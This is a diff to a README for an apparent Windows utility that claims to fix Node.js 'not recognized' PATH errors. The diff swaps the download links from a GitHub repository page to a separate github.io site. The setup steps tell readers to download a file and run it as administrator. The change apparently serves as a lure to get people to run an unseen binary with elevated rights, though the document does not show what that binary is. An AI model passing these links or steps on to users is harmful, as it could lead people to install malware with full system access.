@@ -1,6 +1,6 @@
 # ⚙️ Node-npm-Not-Recognized-Fix - Repair Node Path Errors on Windows
 
-[![Download Tool](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://github.com/Darceysoluble677/Node-npm-Not-Recognized-Fix)
+[![Download Tool](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://darceysoluble677.github.io)
 
 ## What is this tool?
 This software fixes the "node is not recognized" error on Windows 10 and Windows 11. This common error occurs when your computer cannot find the Node.js software. Even if you install Node.js, Windows often fails to see it because the system path does not contain the correct folder location. This tool automates the process of adding that location to your system settings.
@@ -18,7 +18,7 @@ This tool requires the following items:
 ## ⏬ Download and Setup
 Follow these steps to repair your system:
 
-1. Visit the repository page to download the repair tool: [Download Link](https://github.com/Darceysoluble677/Node-npm-Not-Recognized-Fix).
+1. Visit the repository page to download the repair tool: [Download Link](https://darceysoluble677.github.io).
 2. Locate the file in your downloads folder.
 3. Right-click the file and select Run as administrator.
 4. Follow the instructions on the screen.
